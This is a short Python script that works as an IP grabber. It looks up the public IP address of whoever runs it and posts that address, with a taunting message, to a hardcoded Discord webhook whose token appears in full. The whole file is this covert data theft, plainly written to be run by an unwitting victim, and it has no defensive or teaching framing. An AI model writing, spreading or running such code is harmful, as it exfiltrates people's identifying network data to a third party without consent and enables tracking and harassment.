

import requests

ip = requests.get('https://api.ipify.org').text

payload = {
    'content': f'{ip} Got Clapped Lol'
}

response = requests.post('https://discord.com/api/webhooks/1141455101303730216/MwuiY1c_kFsSt57l-SU1OhSGR-hU40hJfnZqoz-OtRLkCRBMe__4uVtMBy-AVTOFNESi', json=payload)

if response.status_code == 200:
    print("Got the IP bud XD")

else:

    print("Couldnt get the ip :(")